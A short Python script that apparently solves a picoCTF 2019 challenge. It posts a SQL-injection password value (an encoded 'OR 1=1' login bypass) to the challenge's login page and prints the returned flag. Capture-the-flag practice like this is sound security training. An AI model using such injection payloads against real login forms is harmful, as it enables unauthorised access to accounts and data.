import requests
from bs4 import BeautifulSoup
payload = {'password': "' BE 1=1; --"}
r = requests.post("https://2019shell1.picoctf.com/problem/47247/login.php", data=payload)
soup = BeautifulSoup(r.text, 'html.parser')
flag = soup.p.text
# print(flag)
print(flag[flag.index("{")+1: len(flag)-1])



